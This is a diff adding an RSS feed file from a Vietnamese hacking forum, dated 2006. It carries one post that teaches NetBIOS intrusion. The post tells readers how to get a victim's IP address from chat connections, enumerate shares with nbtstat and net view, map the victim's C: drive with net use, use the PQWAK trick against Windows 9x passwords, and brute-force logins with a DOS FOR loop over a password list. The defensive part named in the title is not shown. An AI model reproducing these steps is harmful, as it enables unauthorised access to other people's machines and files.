@@ -1,0 +1,120 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "NetBIOS hacking và cách phòng chống  (by Phuongdong)"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/12.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "NetBIOS hacking và cách phòng chống  (by Phuongdong)"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>NetBIOS hacking và cách phòng chống  (by Phuongdong)</title>
+				<description><![CDATA[ <b>Mở đầu </b>
+Thấy các bạn Newbie hỏi về các lệnh net ... và về IPC$, SAM nên mình viết bài này để share một số thông tin rất cơ bản cho các bạn còn chưa rõ cách sử dụng nó
+
+NetBIOS là viết tắt của chữ Network Basic Input Output System. Đầu tiên nó được IBM và Sytek xây dựng để truy nhập vào các tài nguyên được chia sẻ trong mạng LAN ( Local Area Network ). Tài nguyên trong mạng có thể là ổ đĩa, máy in , máy scan .... 
+Nếu bạn đã từng làm việc trong các mạng LAN và sử dụng hệ điều hành Windows ( windows9.x , me, 2000, XP .... ) thì bạn đã từng bấm đúp chuột vào biểu tượng Network Neghborhood ( hay My Network Places ) để truy nhập tới các may tính khác trong mạng => đó chính là bạn đã sử dụng một số lệnh của NetBIOS trong môi trường Winđows.
+Mỗi mỗi service trong máy đều làm việc trên một cổng nào đó, NetBIOS cũng được gán cho một số cổng tùy theo bạn đang sử dụng HDH nào.
+TCP 135 RPC/DCE Endpoint mapper
+UDP 137 NetBIOS Name Service
+UDP 138 NetBIOS Datagram Service
+TCP 139 NetBIOS Sesion Service ( SMB/CIFS over NetBIOS
+TCP/UDP 445 Direct Host
+( SMB - Server Mesage Block 
+CIFS - Common Internet File System )
+Mặc định thì Windows 9.x ( 95,98,98se ), NT4 và Windows2000 sẽ lắng nghe trên cổng 139, nhưng Windows 9.x không lắng nghe trên cổng TCP/UDP 135 ( => chính vì điều này mà đợt vừa qua khi phát hiện ra lỗi RPC , Virus Blaster không gây ảnh hưởng gì cho các máy tính đang chạy Windows 9.x ) Windows 2000 và XP cũng lắng nghe trên các cổng TCP/UDP 445
+=> Dựa vào các hiểu biết này và các lệnh của Windows ( các lệnh này thường nằm trong C:\Windows\system32 - hoặc WinNT \ system32 ) người ta có thể truy nhập vào các máy tinh khác trong mạng 
+
+<b>Tìm kiếm IP của victim </b>
+
+Nhắc lại một tý về IP : IP là một số xác định được gán cho mỗi máy tính trong một mạng nào đó.
+IP được biểu diễn là một số 32 bit, các bit đựơc chia thành 4 phần mỗi phần 8 bit ( 1 byte ). Có 3 cách để biểu diễn cho một địa chỉ IP
+Dạng thập phân ( dạng hay dùng nhất ) Ví dụ : 130.57.30.56
+Dạng nhị phân : 10000010.00111001.00011110.00111000
+Dạng Hexadecimal 82 39 1E 38
+Trong mỗi địa chỉ IP bao giờ cũng có hai phần là địa chỉ mạng ( Networrk Address ) và địa chỉ máy ( Node Address ). Các máy tính trong một mạng bao giờ cũng có cùng một địa chỉ mạng 
+( Các bạn có thể tìm thấy bài viết chi tiết về địa chỉ IP trên HVA portal )
+Để biết địa chỉ IP của mình bạn có thể dùng lệnh trong windows để xem :
+1- Nếu bạn đang dùng Windows 9,x :
+Bấm vào Start \ run sau đó đánh vào lệnh command rồi bấm OK ( Để chạy ra màn hình DOS - DOS shell )
+Tại dấu nhắc của lệnh DOS đánh vào lệnh IPCONFIG ( hoặc IPCONFIG / ALL )
+Nếu bạn dùng Win98 có thể sử dụng Start \run rồi đánh vào lệnh WINIPCFG cũng cho kết quả tương tự
+2- Nếu bạn dùng Win2000, XP ...
+Bấm vào Start \ run sau đó đánh vào lệnh cmd rồi bấm OK ( Để chạy ra màn hình DOS - DOS shell )
+Tại dấu nhắc của lệnh DOS đánh vào lệnh IPCONFIG ( hoặc IPCONFIG / ALL ) 
+Bạn chú ý nhìn dòng IP Address rồi nhìn sang bên phải thấy một số có dạng xxxx.xxxx.xxx.xxx <= đó chính là địa chỉ IP của bạn khi bạn vào mạng
+Công việc tìm kiếm IP và xem nó có mở cổng không của victim thường mất rất nhiều thời gian - Người ta có thể dùng một số Tool để thực hiện việc tìm kiếm cho nhanh ( và đỡ tốn tiền Net ) như NetScanPro2000, hay Esential NetTools ( ET3 ), IP Tool ... 
+- Bài hướng dẫn về cách sử dụng và nơi Download cũng có trên 4rum - Các bạn có thể vào mục đồ nghề để tìm 
+
+Nếu bạn đang sử dụng ICQ để chát với victim bạn có thể sử dụng lệnh netstat -n ( lệnh này sẽ cho ta biết các kết nối đựơc thiết lập giữa máy của ta và bên ngoài và qua các cổng nào ) để biết IP của victim.
+Ví dụ sau khi chạy lệnh netstat -n ta sẽ nhận đựơc bảng sau :
+Active Connections
+Proto Local Address Foreign Address State
+TCP 192.168.0.1:3537 203.195.136.156:2869 Established
+........................................................................................................................................................................................
+Bạn chú ý nhìn ở dưới dòng chữ Foreign Address số 203.195.136.156 <= Đó là địa chỉ IP của victim, còn số 2869 chính là cổng kết nối
+Chữ Established => báo cho bạn biết một kết nối đã được thiết lập giữa máy tính của bạn và victim.
+Còn nếu bạn sử dụng MSN hay YH, nếu sử dụng lệnh netstat - n có thể bạn không nhìn thấy IP của victim mà có thể là địa chỉ của Server của MSN hay YH
+Để xác định chính xác bạn có thể sử dụng Send File của YH để gửi một file tới victim. Trước khi Send File, sử dụng lệnh netstat -n để xác định các kết nối đã có
+trong khi đang Send file bạn lại sưe dụng lệnh netstat -n +> sau đó tìm địa chỉ IP nào mà mới được thiết lập => đó chình là dịa chỉ IP của Victim ( vì khi Send file nó se thiết lập một kết nối trực tiếp giữa máy bạn và victim )
+
+Sau khi đã có địa chỉ IP của victim bạn sử dụng lênh nbtstat -a ipAddress ( lệnh này dùng để xác đinh một số thông tin trên máy victim ... )
+Ví dụ : C:> nbtstat - a 203.210.136.23 ( <= Đây là địa chỉ mô phỏng thôi đấy nhé - đừng thử  )
+Bạn có thể nhận được các dòng như sau 
+NetBIOS remote Machine Name Table
+Name Type Status
+may1 <00> Unique Registered
+netde<00> Group Registered
+may1 <03> Unique Registered
+may1 <20> Unique Registered
+...............................
+MAC address 00-32-04-14-23-E6
+Ở đây bạn chú ý đến số <20> => Nếu thấy số này có nghĩa là máy victim đã bật chế độ chia sẻ File và máy in ( File And Printer Sharing )
+Tiếp theo ta sử dụng lệnh net view \\ipaddress ( lệnh này dùng để xem máy vic tim chia sẻ những cái gì để còn .... )
+Ví dụ : C:> net view \\203.210.136.23
+Bạn có thể thấy các dòng tương tự như ở dưới đây :
+Shared resource at \\203.210.136.23
+Share name Type User As Comment
+C Disk 
+D Disk
+IPC$ Disk 
+.........................................................................
+The command complete succesfully
+=D> Đến đây bạn vào tìm file LMHost - nếu không có thì tạo ra ( Nếu bạn sử dụng window98 thì nó nằm ngay trong thư mục windows, nếu là XP thì trong thư mục Windows\System32\Drivers \etc còn Win2000 thì nằm trong WinNT\System32\Drivers \etc )
+Lạm bàn về LMHost : Ngày trước tên máy và địa chỉ IP được lưu vào trong đó - Nó được dùng để phân giải tên máy và địa chỉ IP ( Name - to - Address )
+File này được cập nhật và quản lý bởi SRI - NIC ( Standford Research Institute Network Information Center ), vài tuần một lần tổ chức này lại cập nhật lại nội dung File này
+Ngày trước các Admin của mạng thường Download về Server của mình. Dần dần số lượng của các trang Web trên Net ngày càng nhiều => cách sử dụng này trở nên thiếu hiệu quả và mất thời gian => DNS ra đời ...
+( Cũng có bài viết chi tiết về DNS trên HVA portal )
+Sau đó bạn thêm vào trong File này theo cú pháp sau : 
+ipAddressvictim tênmáy #PRE
+
+Ví dụ ở đây tôi thêm vào dòng : 203.210.136.23 MAY1 #PRE trong File LMHost
+rồi chạy lệnh nbtstat -R để nạp lại table cache
+Bây giờ bạn có thể tạo thêm một ổ trên máy tính của mình và kết nối tới ở hay thư mục được Share trên máy tính của victim bằng cách sử dụng lênh Net use
+Net use Tênổđĩa : \\ipAddressVictim\shareName
+Ví dụ : Net use X: \\203.210.136.23\C
+Nếu thấy dòng lệnh 
+The command was complete succesfully 
+Done, bấm đúp vào My Computer và xem thử xem có gì mới trong máy tính của ta không.
+Để tránh nhầm lẫn khi ánh xạ ổ đĩa ta có thể sử dụng ký hiệu * thay cho tên ổ đĩa
+net use * \\203.210.136.23\C
+
+Thế nhưng nhiều khi cuộc đời không đẹp như mơ vì khi thực hiện đường truyền của bạn chậm hay vì máy victim đặt pass truy nhập. ...
+Nếu máy victim sử dụng Windows95,98,98se hay Win me bạn có thể tạm dùng pass : PQWAK ( cái này giống như kiểu concat trên các Main đời cũ  )
+Thế thì còn máy tính dùng 2000 hay XP ... mà đặt pass và user thì làm thế nào => ta có thể xây dựng một từ điển để dò và sử dụng lệnh For của DOS để thực hiện
+Vídụ tôi sẽ tạo ra một File có tên là DoPass.txt và có định dạng sau :
+password username
+password Administrator
+"" Administrator
+admin Administrator
+............................................................
+
+Và bấy giờ ta có thể sử dụng lệnh For
+C:\FOR /F "token=1,2* " %i in (DoPass.txt ) Do net use \\IpAddressvictim\ShareName 
+( cú pháp sử dụng của lệnh FOR xin các bạn xem trong help của Windows )
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/655.hva#2300</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/655.hva#2300</link>
+				<pubDate><![CDATA[Thu, 29 Jun 2006 19:10:56]]> GMT</pubDate>
+				<author><![CDATA[ lawlesscoder]]></author>
+			</item>
+	</channel>
+</rss>
